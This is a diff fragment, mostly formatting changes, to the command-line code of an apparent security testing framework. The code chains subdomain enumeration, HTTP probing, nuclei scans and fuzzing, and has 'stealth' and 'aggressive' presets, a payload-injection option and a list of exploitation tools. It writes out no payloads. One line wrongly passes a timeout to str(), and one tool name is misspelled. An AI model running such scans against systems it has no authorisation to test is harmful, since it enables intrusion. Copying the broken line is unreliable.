action='store_true',\n-                           help='Run advanced vulnerability assessment')\n-    scan_group.add_argument('--full', action='store_true',\n-                           help='Run complete pipeline (recon + vuln + report)')\n-    scan_group.add_argument('--bcar', action='store_true',\n-                           help='Run BCAR enhanced reconnaissance')\n-    scan_group.add_argument('--takeover', action='store_true',\n-                           help='Run subdomain takeover detection')\n-    scan_group.add_argument('--fuzz', action='store_true',\n-                           help='Run comprehensive fuzzing')\n-    scan_group.add_argument('--payload-inject', action='store_true',\n-                           help='Run automated payload injection')\n-    scan_group.add_argument('--preset', choices=['fast', 'deep', 'stealth', 'aggressive'],\n-                           help='Use predefined scan preset')\n+    scan_group = parser.add_argument_group(\"Scan Types\")\n+    scan_group.add_argument(\n+        \"--recon\", action=\"store_true\", help=\"Run enhanced reconnaissance scan\"\n+    )\n+    scan_group.add_argument(\n+        \"--vuln\", action=\"store_true\", help=\"Run advanced vulnerability assessment\"\n+    )\n+    scan_group.add_argument(\n+        \"--full\",\n+        action=\"store_true\",\n+        help=\"Run complete pipeline (recon + vuln + report)\",\n+    )\n+    scan_group.add_argument(\n+        \"--bcar\", action=\"store_true\", help=\"Run BCAR enhanced reconnaissance\"\n+    )\n+    scan_group.add_argument(\n+        \"--takeover\", action=\"store_true\", help=\"Run subdomain takeover detection\"\n+    )\n+    scan_group.add_argument(\n+        \"--fuzz\", action=\"store_true\", help=\"Run comprehensive fuzzing\"\n+    )\n+    scan_group.add_argument(\n+        \"--payload-inject\", action=\"store_true\", help=\"Run automated payload injection\"\n+    )\n+    scan_group.add_argument(\n+        \"--preset\",\n+        choices=[\"fast\", \"deep\", \"stealth\", \"aggressive\"],\n+        help=\"Use predefined scan preset\",\n+    )\n \n     # Configuration\n-    config_group = parser.add_argument_group('Configuration')\n-    config_group.add_argument('--config', type=str,\n-                             help='Path to custom configuration file')\n-    config_group.add_argument('--threads', type=int, default=0,\n-                             help='Number of threads (0 = auto)')\n-    config_group.add_argument('--timeout', type=int, default=600,\n-                             help='Scan timeout in seconds')\n-    config_group.add_argument('--rate-limit', type=int, default=50,\n-                             help='Rate limit (requests per second)')\n-    config_group.add_argument('--depth', type=int, default=3,\n-                             help='Scanning depth level (1-5)')\n+    config_group = parser.add_argument_group(\"Configuration\")\n+    config_group.add_argument(\n+        \"--config\", type=str, help=\"Path to custom configuration file\"\n+    )\n+    config_group.add_argument(\n+        \"--threads\", type=int, default=0, help=\"Number of threads (0 = auto)\"\n+    )\n+    config_group.add_argument(\n+        \"--timeout\", type=int, default=600, help=\"Scan timeout in seconds\"\n+    )\n+    config_group.add_argument(\n+        \"--rate-limit\", type=int, default=50, help=\"Rate limit (requests per second)\"\n+    )\n+    config_group.add_argument(\n+        \"--depth\", type=int, default=3, help=\"Scanning depth level (1-5)\"\n+    )\n \n     # Output options\n-    output_group = parser.add_argument_group('Output Options')\n-    output_group.add_argument('--output', choices=['json', 'xml', 'html', 'txt'],\n-                             default='txt', help='Output format')\n-    output_group.add_argument('--outfile', type=str,\n-                             help='Save results to specified file')\n-    output_group.add_argument('--quiet', '-q', action='store_true',\n-                             help='Minimal output')\n-    output_group.add_argument('--verbose', '-v', action='store_true',\n-                             help='Verbose output')\n-    output_group.add_argument('--debug', action='store_true',\n-                             help='Debug mode with extensive logging')\n+    output_group = parser.add_argument_group(\"Output Options\")\n+    output_group.add_argument(\n+        \"--output\",\n+        choices=[\"json\", \"xml\", \"html\", \"txt\"],\n+        default=\"txt\",\n+        help=\"Output format\",\n+    )\n+    output_group.add_argument(\n+        \"--outfile\", type=str, help=\"Save results to specified file\"\n+    )\n+    output_group.add_argument(\n+        \"--quiet\", \"-q\", action=\"store_true\", help=\"Minimal output\"\n+    )\n+    output_group.add_argument(\n+        \"--verbose\", \"-v\", action=\"store_true\", help=\"Verbose output\"\n+    )\n+    output_group.add_argument(\n+        \"--debug\", action=\"store_true\", help=\"Debug mode with extensive logging\"\n+    )\n \n     # Advanced options\n-    advanced_group = parser.add_argument_group('Advanced Options')\n-    advanced_group.add_argument('--wordlist', type=str,\n-                               help='Custom wordlist file')\n-    advanced_group.add_argument('--payloads', type=str,\n-                               help='Custom payloads file')\n-    advanced_group.add_argument('--exclude', type=str,\n-                               help='Exclude patterns (comma-separated)')\n-    advanced_group.add_argument('--include-only', type=str,\n-                               help='Include only patterns (comma-separated)')\n-    advanced_group.add_argument('--user-agent', type=str,\n-                               help='Custom User-Agent string')\n-    advanced_group.add_argument('--proxy', type=str,\n-                               help='Proxy URL (http://host:port)')\n+    advanced_group = parser.add_argument_group(\"Advanced Options\")\n+    advanced_group.add_argument(\"--wordlist\", type=str, help=\"Custom wordlist file\")\n+    advanced_group.add_argument(\"--payloads\", type=str, help=\"Custom payloads file\")\n+    advanced_group.add_argument(\n+        \"--exclude\", type=str, help=\"Exclude patterns (comma-separated)\"\n+    )\n+    advanced_group.add_argument(\n+        \"--include-only\", type=str, help=\"Include only patterns (comma-separated)\"\n+    )\n+    advanced_group.add_argument(\n+        \"--user-agent\", type=str, help=\"Custom User-Agent string\"\n+    )\n+    advanced_group.add_argument(\n+        \"--proxy\", type=str, help=\"Proxy URL (http://host:port)\"\n+    )\n \n     # Tool management\n-    tools_group = parser.add_argument_group('Tool Management')\n-    tools_group.add_argument('--install-tools', action='store_true',\n-                            help='Install missing security tools')\n-    tools_group.add_argument('--check-tools', action='store_true',\n-                            help='Check tool availability and exit')\n-    tools_group.add_argument('--update-wordlists', action='store_true',\n-                            help='Update wordlists and exit')\n+    tools_group = parser.add_argument_group(\"Tool Management\")\n+    tools_group.add_argument(\n+        \"--install-tools\", action=\"store_true\", help=\"Install missing security tools\"\n+    )\n+    tools_group.add_argument(\n+        \"--check-tools\", action=\"store_true\", help=\"Check tool availability and exit\"\n+    )\n+    tools_group.add_argument(\n+        \"--update-wordlists\", action=\"store_true\", help=\"Update wordlists and exit\"\n+    )\n \n     return parser\n+\n \n def handle_cli_execution(args):\n     \"\"\"Handle command-line execution based on parsed arguments\"\"\"\n     try:\n         # Setup logging based on verbosity\n@@ -9067,17 +11145,17 @@\n         # Validate targets\n         targets = []\n         if args.target:\n             if Path(args.target).exists():\n                 # It's a file\n-                with open(args.target, 'r') as f:\n+                with open(args.target, \"r\") as f:\n                     targets = [line.strip() for line in f if line.strip()]\n             else:\n                 # It's a single target\n                 targets = [args.target]\n         elif args.targets_file:\n-            with open(args.targets_file, 'r') as f:\n+            with open(args.targets_file, \"r\") as f:\n                 targets = [line.strip() for line in f if line.strip()]\n \n         if not targets:\n             logger.log(\"No targets specified. Use -t or --targets-file\", \"ERROR\")\n             return 1\n@@ -9096,44 +11174,44 @@\n \n         # Load configuration\n         cfg = load_cfg()\n         if args.config:\n             try:\n-                with open(args.config, 'r') as f:\n+                with open(args.config, \"r\") as f:\n                     custom_cfg = json.load(f)\n                 cfg.update(custom_cfg)\n             except Exception as e:\n                 logger.log(f\"Failed to load config file: {e}\", \"ERROR\")\n                 return 1\n \n         # Apply CLI arguments to configuration\n         if args.threads > 0:\n-            cfg['threads'] = args.threads\n+            cfg[\"threads\"] = args.threads\n         if args.timeout:\n-            cfg['timeout'] = args.timeout\n+            cfg[\"timeout\"] = args.timeout\n         if args.rate_limit:\n-            cfg['rate_limit'] = args.rate_limit\n+            cfg[\"rate_limit\"] = args.rate_limit\n         if args.depth:\n-            cfg['scan_depth'] = args.depth\n+            cfg[\"scan_depth\"] = args.depth\n         if args.wordlist:\n-            cfg['custom_wordlist'] = args.wordlist\n+            cfg[\"custom_wordlist\"] = args.wordlist\n         if args.payloads:\n-            cfg['custom_payloads'] = args.payloads\n+            cfg[\"custom_payloads\"] = args.payloads\n         if args.user_agent:\n-            cfg['user_agent'] = args.user_agent\n+            cfg[\"user_agent\"] = args.user_agent\n         if args.proxy:\n-            cfg['proxy'] = args.proxy\n+            cfg[\"proxy\"] = args.proxy\n \n         # Initialize run\n         scan_name = \"cli_batch_scan\" if args.batch else \"cli_scan\"\n         rd, env = start_run(scan_name)\n \n         # Store targets\n         rd.targets = validated_targets\n         targets_file = rd.run_dir / \"targets.txt\"\n-        with open(targets_file, 'w') as f:\n-            f.write('\\n'.join(validated_targets))\n+        with open(targets_file, \"w\") as f:\n+            f.write(\"\\n\".join(validated_targets))\n \n         results = {}\n \n         # Execute scans based on arguments\n         if args.preset:\n@@ -9173,18 +11251,19 @@\n         return 130\n     except Exception as e:\n         logger.log(f\"CLI execution failed: {e}\", \"ERROR\")\n         return 1\n \n+\n # ---------- Main ----------\n def main():\n     # Setup argument parser\n     parser = setup_argument_parser()\n \n     # If no arguments provided, run interactive mode\n     if len(sys.argv) == 1:\n-        sys.argv.append('--interactive')\n+        sys.argv.append(\"--interactive\")\n \n     # Parse arguments\n     try:\n         args = parser.parse_args()\n     except SystemExit as e:\n@@ -9197,37 +11276,50 @@\n \n     # Non-interactive header for CLI mode\n     if not args.interactive:\n         print(BANNER)\n         print(f\"\\033[91m{APP} v{VERSION}-ENHANCED\\033[0m by {AUTHOR}\")\n-        print(\"\\033[93m[SECURITY] Advanced Security Testing Framework - CLI Mode\\033[0m\")\n+        print(\n+            \"\\033[93m[SECURITY] Advanced Security Testing Framework - CLI Mode\\033[0m\"\n+        )\n \n     # Validate dependencies and environment\n     if not validate_dependencies():\n         if not args.quiet:\n-            logger.log(\"[WARNING] Some dependencies missing. Please run install.sh or install manually.\", \"WARNING\")\n+            logger.log(\n+                \"[WARNING] Some dependencies missing. Please run install.sh or install manually.\",\n+                \"WARNING\",\n+            )\n             logger.log(\"Continuing with available functionality...\", \"WARNING\")\n             time.sleep(1)\n \n     # Auto-fix missing dependencies and wordlists\n     auto_fix_missing_dependencies()\n \n     if not check_and_setup_environment():\n         if not args.quiet:\n-            logger.log(\"Environment setup issues detected. Some features may not work correctly.\", \"WARNING\")\n+            logger.log(\n+                \"Environment setup issues detected. Some features may not work correctly.\",\n+                \"WARNING\",\n+            )\n \n     # Resolve conflicting flags to avoid interactive hangs in CI/tests\n-    if getattr(args, 'interactive', False) and getattr(args, 'batch', False):\n-        logger.log(\"Conflicting options: --interactive and --batch supplied; proceeding in non-interactive batch mode\", \"WARNING\")\n+    if getattr(args, \"interactive\", False) and getattr(args, \"batch\", False):\n+        logger.log(\n+            \"Conflicting options: --interactive and --batch supplied; proceeding in non-interactive batch mode\",\n+            \"WARNING\",\n+        )\n         args.interactive = False\n \n     # Handle CLI execution or interactive mode\n     if args.interactive:\n         # Original interactive menu system\n         print(BANNER)\n         print(f\"\\033[91m{APP} v{VERSION}-ENHANCED\\033[0m by {AUTHOR}\")\n-        print(\"\\033[93m[SECURITY] Advanced Security Testing Framework with Enhanced Capabilities\\033[0m\")\n+        print(\n+            \"\\033[93m[SECURITY] Advanced Security Testing Framework with Enhanced Capabilities\\033[0m\"\n+        )\n \n         while True:\n             display_menu()\n             c = get_choice()\n             if c == 1:\n@@ -9309,54 +11401,65 @@\n                 break\n     else:\n         # CLI mode execution\n         return handle_cli_execution(args)\n \n-def run_preset_scan_cli(preset: str, rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_preset_scan_cli(\n+    preset: str, rd, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run preset scan in CLI mode\"\"\"\n     logger.log(f\"Running {preset} preset scan...\", \"INFO\")\n     results = {\"preset\": preset, \"scans\": {}}\n \n     preset_configs = {\n-        'fast': {'scan_depth': 1, 'timeout': 300, 'tools': ['subfinder', 'httpx', 'nuclei']},\n-        'deep': {'scan_depth': 4, 'timeout': 1800, 'tools': ['all']},\n-        'stealth': {'scan_depth': 2, 'timeout': 900, 'rate_limit': 5},\n-        'aggressive': {'scan_depth': 5, 'timeout': 3600, 'rate_limit': 100}\n+        \"fast\": {\n+            \"scan_depth\": 1,\n+            \"timeout\": 300,\n+            \"tools\": [\"subfinder\", \"httpx\", \"nuclei\"],\n+        },\n+        \"deep\": {\"scan_depth\": 4, \"timeout\": 1800, \"tools\": [\"all\"]},\n+        \"stealth\": {\"scan_depth\": 2, \"timeout\": 900, \"rate_limit\": 5},\n+        \"aggressive\": {\"scan_depth\": 5, \"timeout\": 3600, \"rate_limit\": 100},\n     }\n \n     # Apply preset configuration\n-    preset_cfg = preset_configs.get(preset, preset_configs['fast'])\n+    preset_cfg = preset_configs.get(preset, preset_configs[\"fast\"])\n     cfg.update(preset_cfg)\n \n     # Run reconnaissance\n-    if preset in ['fast', 'deep', 'aggressive']:\n-        results['scans']['recon'] = run_recon_cli(rd, env, cfg)\n+    if preset in [\"fast\", \"deep\", \"aggressive\"]:\n+        results[\"scans\"][\"recon\"] = run_recon_cli(rd, env, cfg)\n \n     # Run vulnerability scan\n-    if preset in ['deep', 'aggressive']:\n-        results['scans']['vuln'] = run_vuln_cli(rd, env, cfg)\n+    if preset in [\"deep\", \"aggressive\"]:\n+        results[\"scans\"][\"vuln\"] = run_vuln_cli(rd, env, cfg)\n \n     return results\n \n-def run_full_pipeline_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_full_pipeline_cli(\n+    rd, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run full pipeline in CLI mode\"\"\"\n     logger.log(\"Running full pipeline (recon + vuln + report)...\", \"INFO\")\n     results = {\"pipeline\": \"full\", \"scans\": {}}\n \n     # Run reconnaissance\n-    results['scans']['recon'] = run_recon_cli(rd, env, cfg)\n+    results[\"scans\"][\"recon\"] = run_recon_cli(rd, env, cfg)\n \n     # Run vulnerability assessment\n-    results['scans']['vuln'] = run_vuln_cli(rd, env, cfg)\n+    results[\"scans\"][\"vuln\"] = run_vuln_cli(rd, env, cfg)\n \n     # Generate report\n     report_file = rd.run_dir / \"full_pipeline_report.json\"\n-    with open(report_file, 'w') as f:\n+    with open(report_file, \"w\") as f:\n         json.dump(results, f, indent=2, default=str)\n \n-    results['report_file'] = str(report_file)\n+    results[\"report_file\"] = str(report_file)\n     return results\n+\n \n def run_recon_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n     \"\"\"Run reconnaissance in CLI mode\"\"\"\n     logger.log(\"Starting enhanced reconnaissance...\", \"INFO\")\n     results = {\"phase\": \"reconnaissance\", \"targets\": rd.targets, \"findings\": {}}\n@@ -9368,40 +11471,45 @@\n         # Subdomain enumeration\n         if which(\"subfinder\"):\n             subdomain_file = rd.run_dir / f\"{target}_subdomains.txt\"\n             run_subfinder(target, subdomain_file, env)\n             if subdomain_file.exists():\n-                with open(subdomain_file, 'r') as f:\n-                    target_results['subdomains'] = [line.strip() for line in f if line.strip()]\n+                with open(subdomain_file, \"r\") as f:\n+                    target_results[\"subdomains\"] = [\n+                        line.strip() for line in f if line.strip()\n+                    ]\n \n         # HTTP probe\n-        if target_results.get('subdomains'):\n+        if target_results.get(\"subdomains\"):\n             all_targets_file = rd.run_dir / f\"{target}_all_targets.txt\"\n-            with open(all_targets_file, 'w') as f:\n+            with open(all_targets_file, \"w\") as f:\n                 f.write(f\"{target}\\n\")\n-                f.write('\\n'.join(target_results['subdomains']))\n+                f.write(\"\\n\".join(target_results[\"subdomains\"]))\n \n             http_file = rd.run_dir / f\"{target}_http_results.json\"\n-            run_httpx(all_targets_file, http_file, env, cfg.get('timeout', 10))\n+            run_httpx(all_targets_file, http_file, env, cfg.get(\"timeout\", 10))\n             if http_file.exists():\n                 try:\n-                    with open(http_file, 'r') as f:\n-                        target_results['http_services'] = [json.loads(line) for line in f if line.strip()]\n+                    with open(http_file, \"r\") as f:\n+                        target_results[\"http_services\"] = [\n+                            json.loads(line) for line in f if line.strip()\n+                        ]\n                 except json.JSONDecodeError:\n                     pass\n \n         # Technology detection\n-        if target_results.get('http_services'):\n-            for service in target_results['http_services'][:5]:  # Limit to first 5\n-                url = service.get('url', '')\n+        if target_results.get(\"http_services\"):\n+            for service in target_results[\"http_services\"][:5]:  # Limit to first 5\n+                url = service.get(\"url\", \"\")\n                 if url:\n                     tech_file = rd.run_dir / f\"{target}_tech_{hash(url) % 1000}.json\"\n                     run_whatweb(url, tech_file, env)\n \n-        results['findings'][target] = target_results\n+        results[\"findings\"][target] = target_results\n \n     return results\n+\n \n def run_vuln_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n     \"\"\"Run vulnerability assessment in CLI mode\"\"\"\n     logger.log(\"Starting vulnerability assessment...\", \"INFO\")\n     results = {\"phase\": \"vulnerability\", \"targets\": rd.targets, \"vulnerabilities\": {}}\n@@ -9413,33 +11521,45 @@\n         # Get HTTP services from recon phase\n         http_file = rd.run_dir / f\"{target}_http_results.json\"\n         urls = []\n         if http_file.exists():\n             try:\n-                with open(http_file, 'r') as f:\n+                with open(http_file, \"r\") as f:\n                     for line in f:\n                         if line.strip():\n                             service = json.loads(line)\n-                            if service.get('url'):\n-                                urls.append(service['url'])\n+                            if service.get(\"url\"):\n+                                urls.append(service[\"url\"])\n             except json.JSONDecodeError:\n                 urls = [f\"http://{target}\"]\n         else:\n             urls = [f\"http://{target}\"]\n \n         # Nuclei scanning\n         if which(\"nuclei\") and urls:\n             for url in urls[:3]:  # Limit to first 3 URLs\n                 nuclei_file = rd.run_dir / f\"{target}_nuclei_{hash(url) % 1000}.json\"\n-                run_cmd([\n-                    \"nuclei\", \"-u\", url, \"-severity\", \"low,medium,high,critical\",\n-                    \"-jsonl\", \"-silent\", \"-o\", str(nuclei_file)\n-                ], env=env, timeout=300, check_return=False)\n+                run_cmd(\n+                    [\n+                        \"nuclei\",\n+                        \"-u\",\n+                        url,\n+                        \"-severity\",\n+                        \"low,medium,high,critical\",\n+                        \"-jsonl\",\n+                        \"-silent\",\n+                        \"-o\",\n+                        str(nuclei_file),\n+                    ],\n+                    env=env,\n+                    timeout=300,\n+                    check_return=False,\n+                )\n \n                 if nuclei_file.exists():\n                     try:\n-                        with open(nuclei_file, 'r') as f:\n+                        with open(nuclei_file, \"r\") as f:\n                             vulns = []\n                             for line in f:\n                                 if line.strip():\n                                     vuln = json.loads(line)\n                                     vulns.append(vuln)\n@@ -9453,53 +11573,55 @@\n                 fuzz_file = rd.run_dir / f\"{target}_fuzz_{hash(url) % 1000}.json\"\n                 common_wordlist = EXTRA_DIR / \"common_directories.txt\"\n                 if common_wordlist.exists():\n                     run_ffuf(url, common_wordlist, fuzz_file, env)\n \n-        results['vulnerabilities'][target] = target_vulns\n+        results[\"vulnerabilities\"][target] = target_vulns\n \n     return results\n+\n \n def save_results_to_file(results: Dict[str, Any], filename: str, format_type: str):\n     \"\"\"Save scan results to file in specified format\"\"\"\n     output_path = Path(filename)\n \n     try:\n-        if format_type == 'json':\n-            with open(output_path, 'w') as f:\n+        if format_type == \"json\":\n+            with open(output_path, \"w\") as f:\n                 json.dump(results, f, indent=2, default=str)\n-        elif format_type == 'xml':\n+        elif format_type == \"xml\":\n             # Simple XML conversion\n-            xml_content = dict_to_xml(results, 'scan_results')\n-            with open(output_path, 'w') as f:\n+            xml_content = dict_to_xml(results, \"scan_results\")\n+            with open(output_path, \"w\") as f:\n                 f.write(xml_content)\n-        elif format_type == 'html':\n+        elif format_type == \"html\":\n             html_content = generate_html_report(results)\n-            with open(output_path, 'w') as f:\n+            with open(output_path, \"w\") as f:\n                 f.write(html_content)\n         else:  # txt format\n             txt_content = dict_to_text(results)\n-            with open(output_path, 'w') as f:\n+            with open(output_path, \"w\") as f:\n                 f.write(txt_content)\n \n         logger.log(f\"Results saved to: {output_path}\", \"SUCCESS\")\n     except Exception as e:\n         logger.log(f\"Failed to save results: {e}\", \"ERROR\")\n+\n \n def display_results(results: Dict[str, Any], format_type: str, quiet: bool = False):\n     \"\"\"Display scan results in specified format\"\"\"\n     if quiet:\n         return\n \n-    if format_type == 'json':\n+    if format_type == \"json\":\n         print(json.dumps(results, indent=2, default=str))\n     else:\n         print(dict_to_text(results))\n \n+\n def dict_to_xml(data: Dict[str, Any], root_name: str = \"data\") -> str:\n     \"\"\"Convert dictionary to XML format\"\"\"\n-\n \n     def dict_to_xml_recursive(d, name):\n         if isinstance(d, dict):\n             items = []\n             for k, v in d.items():\n@@ -9513,10 +11635,11 @@\n         else:\n             return f\"<{name}>{str(d)}</{name}>\"\n \n     return f'<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n{dict_to_xml_recursive(data, root_name)}'\n \n+\n def dict_to_text(data: Dict[str, Any], indent: int = 0) -> str:\n     \"\"\"Convert dictionary to readable text format\"\"\"\n     text = \"\"\n     prefix = \"  \" * indent\n \n@@ -9530,10 +11653,11 @@\n             text += dict_to_text(item, indent + 1)\n     else:\n         text += f\"{prefix}{str(data)}\\n\"\n \n     return text\n+\n \n def generate_html_report(results: Dict[str, Any]) -> str:\n     \"\"\"Generate HTML report from results\"\"\"\n     html = \"\"\"<!DOCTYPE html>\n <html>\n@@ -9560,10 +11684,11 @@\n </body>\n </html>\"\"\"\n \n     return html\n \n+\n def launch_advanced_tui():\n     \"\"\"Launch the advanced Terminal User Interface\"\"\"\n     try:\n         logger.log(\"Launching Advanced TUI Interface...\", \"INFO\")\n         import subprocess\n@@ -9571,31 +11696,42 @@\n         # Launch the TUI in a subprocess\n         tui_script = HERE / \"tui_launcher.py\"\n         if tui_script.exists():\n             subprocess.run([sys.executable, str(tui_script, timeout=300)])\n         else:\n-            logger.log(\"TUI launcher not found. Using fallback import method.\", \"WARNING\")\n+            logger.log(\n+                \"TUI launcher not found. Using fallback import method.\", \"WARNING\"\n+            )\n \n             # Try direct import\n             try:\n                 from tui.app import PantheonTUI\n+\n                 app = PantheonTUI()\n                 app.run()\n             except ImportError:\n-                logger.log(\"TUI dependencies missing. Install with: pip install textual\", \"ERROR\")\n+                logger.log(\n+                    \"TUI dependencies missing. Install with: pip install textual\",\n+                    \"ERROR\",\n+                )\n             except Exception as e:\n                 logger.log(f\"TUI launch failed: {e}\", \"ERROR\")\n \n     except Exception as e:\n         logger.log(f\"Failed to launch TUI: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def view_last_report():\n     \"\"\"View the last generated report\"\"\"\n     try:\n-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)\n+        runs = sorted(\n+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],\n+            key=lambda p: p.stat().st_mtime,\n+            reverse=True,\n+        )\n         if not runs:\n             logger.log(\"No reports found\", \"WARNING\")\n             return\n \n         latest_run = runs[0]\n@@ -9612,10 +11748,11 @@\n             run_report_for_latest()\n \n     except Exception as e:\n         logger.log(f\"Error viewing report: {e}\", \"ERROR\")\n \n+\n def enhanced_payload_management_menu():\n     \"\"\"Enhanced payload management menu\"\"\"\n     print(f\"\\n\\033[96m{'='*80}\\033[0m\")\n     print(\"\\033[96mENHANCED PAYLOAD MANAGEMENT\".center(80) + \"\\033[0m\")\n     print(f\"\\033[96m{'='*80}\\033[0m\")\n@@ -9647,13 +11784,18 @@\n             logger.log(\"Creating enhanced wordlists...\", \"INFO\")\n             EnhancedPayloadManager.create_enhanced_wordlists()\n             logger.log(\"\u2705 Enhanced wordlists created\", \"SUCCESS\")\n \n         elif choice == \"4\":\n-            force_update = input(\"Force update existing files? (yes/no): \").strip().lower() == \"yes\"\n+            force_update = (\n+                input(\"Force update existing files? (yes/no): \").strip().lower()\n+                == \"yes\"\n+            )\n             logger.log(\"Downloading payload sources...\", \"INFO\")\n-            if EnhancedPayloadManager.download_payload_sources(force_update=force_update):\n+            if EnhancedPayloadManager.download_payload_sources(\n+                force_update=force_update\n+            ):\n                 logger.log(\"\u2705 Payload sources downloaded\", \"SUCCESS\")\n             else:\n                 logger.log(\"\u26a0\ufe0f Some payload downloads may have failed\", \"WARNING\")\n \n         elif choice == \"5\":\n@@ -9673,10 +11815,11 @@\n \n     except Exception as e:\n         logger.log(f\"Payload management error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def tool_status_management_menu():\n     \"\"\"Tool status and fallback management menu\"\"\"\n     print(f\"\\n\\033[96m{'='*80}\\033[0m\")\n     print(\"\\033[96mTOOL STATUS & FALLBACK MANAGEMENT\".center(80) + \"\\033[0m\")\n@@ -9716,10 +11859,11 @@\n \n     except Exception as e:\n         logger.log(f\"Tool management error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def show_comprehensive_tool_status():\n     \"\"\"Show comprehensive tool status\"\"\"\n     print(\"\\n\\033[92m\ud83d\udd27 Comprehensive Tool Status:\\033[0m\")\n \n@@ -9733,11 +11877,11 @@\n         \"Vulnerability Scanning\": [\"nuclei\", \"nikto\", \"nmap\"],\n         \"Web Technology\": [\"whatweb\", \"webanalyze\"],\n         \"Exploitation\": [\"sqlmap\", \"dalfox\", \"xsstrike\"],\n         \"Parameter Discovery\": [\"arjun\", \"paramspider\"],\n         \"Subdomain Takeover\": [\"subjack\", \"subzy\"],\n-        \"DNS Tools\": [\"dig\", \"nslookup\", \"host\"]\n+        \"DNS Tools\": [\"dig\", \"nslookup\", \"host\"],\n     }\n \n     for category, tools in categories.items():\n         print(f\"\\n  \\033[96m{category}:\\033[0m\")\n         for tool in tools:\n@@ -9748,10 +11892,11 @@\n                 installable = \"\ud83d\udd27\" if tool_status[\"installable\"] else \"\"\n                 print(f\"    {available} {tool} {installable}\")\n                 if alt_count > 0:\n                     print(f\"      \u2514\u2500 {alt_count} alternatives available\")\n \n+\n def test_tool_availability():\n     \"\"\"Test tool availability with fallbacks\"\"\"\n     print(\"\\n\\033[93m\ud83d\udd0d Testing Tool Availability...\\033[0m\")\n \n     test_tools = [\"subfinder\", \"nmap\", \"httpx\", \"nuclei\", \"gobuster\", \"ffu\", \"sqlmap\"]\n@@ -9764,17 +11909,21 @@\n             else:\n                 print(f\"  \ud83d\udd04 {tool} - Using fallback: {available_tool}\")\n         else:\n             print(f\"  \u274c {tool} - No alternatives available\")\n \n+\n def install_missing_tools_menu():\n     \"\"\"Menu for installing missing tools\"\"\"\n     print(\"\\n\\033[93m\ud83d\udd27 Install Missing Tools:\\033[0m\")\n \n     status = EnhancedToolFallbackManager.get_tool_status()\n-    missing_tools = [tool for tool, info in status.items()\n-                    if not info[\"available\"] and info[\"installable\"]]\n+    missing_tools = [\n+        tool\n+        for tool, info in status.items()\n+        if not info[\"available\"] and info[\"installable\"]\n+    ]\n \n     if not missing_tools:\n         logger.log(\"No missing installable tools found\", \"INFO\")\n         return\n \n@@ -9784,11 +11933,13 @@\n \n     print(f\"  {len(missing_tools) + 1}. Install All\")\n     print(f\"  {len(missing_tools) + 2}. Back\")\n \n     try:\n-        choice = input(f\"\\nSelect tool to install (1-{len(missing_tools) + 2}): \").strip()\n+        choice = input(\n+            f\"\\nSelect tool to install (1-{len(missing_tools) + 2}): \"\n+        ).strip()\n \n         if choice.isdigit():\n             choice_num = int(choice)\n             if 1 <= choice_num <= len(missing_tools):\n                 tool_name = missing_tools[choice_num - 1]\n@@ -9802,20 +11953,26 @@\n                 logger.log(\"Installing all missing tools...\", \"INFO\")\n                 success_count = 0\n                 for tool in missing_tools:\n                     if EnhancedToolFallbackManager.install_tool(tool):\n                         success_count += 1\n-                logger.log(f\"\u2705 Installed {success_count}/{len(missing_tools)} tools\", \"INFO\")\n+                logger.log(\n+                    f\"\u2705 Installed {success_count}/{len(missing_tools)} tools\", \"INFO\"\n+                )\n \n     except ValueError:\n         logger.log(\"Invalid selection\", \"ERROR\")\n+\n \n def show_tool_alternatives():\n     \"\"\"Show available alternatives for each tool\"\"\"\n     print(\"\\n\\033[92m\ud83d\udd04 Tool Alternatives:\\033[0m\")\n \n-    for primary_tool, alternatives in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.items():\n+    for (\n+        primary_tool,\n+        alternatives,\n+    ) in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.items():\n         available_alts = [alt for alt in alternatives if which(alt)]\n         status = \"\u2705\" if which(primary_tool) else \"\u274c\"\n \n         print(f\"\\n  {status} {primary_tool}\")\n         if alternatives:\n@@ -9823,18 +11980,26 @@\n                 alt_status = \"\u2705\" if which(alt) else \"\u274c\"\n                 print(f\"    \u2514\u2500 {alt_status} {alt}\")\n         else:\n             print(\"    \u2514\u2500 No alternatives configured\")\n \n+\n def validate_all_dependencies_comprehensive():\n     \"\"\"Comprehensive dependency validation\"\"\"\n     print(\"\\n\\033[93m\ud83d\udd0d Comprehensive Dependency Validation...\\033[0m\")\n \n     # Check core Python modules\n     python_modules = [\n-        \"requests\", \"json\", \"subprocess\", \"pathlib\", \"threading\",\n-        \"concurrent.futures\", \"tempfile\", \"shutil\", \"uuid\"\n+        \"requests\",\n+        \"json\",\n+        \"subprocess\",\n+        \"pathlib\",\n+        \"threading\",\n+        \"concurrent.futures\",\n+        \"tempfile\",\n+        \"shutil\",\n+        \"uuid\",\n     ]\n \n     print(\"\\n\\033[96mPython Modules:\\033[0m\")\n     for module in python_modules:\n         try:\n@@ -9847,47 +12012,57 @@\n     print(\"\\n\\033[96mExternal Tools:\\033[0m\")\n     test_tool_availability()\n \n     # Check directory structure\n     print(\"\\n\\033[96mDirectory Structure:\\033[0m\")\n-    required_dirs = [RUNS_DIR, LOG_DIR, EXT_DIR, EXTRA_DIR, MERGED_DIR, PAYLOADS_DIR, PLUGINS_DIR]\n+    required_dirs = [\n+        RUNS_DIR,\n+        LOG_DIR,\n+        EXT_DIR,\n+        EXTRA_DIR,\n+        MERGED_DIR,\n+        PAYLOADS_DIR,\n+        PLUGINS_DIR,\n+    ]\n     for dir_path in required_dirs:\n         if dir_path.exists():\n             print(f\"  \u2705 {dir_path.name}\")\n         else:\n             print(f\"  \u274c {dir_path.name}\")\n             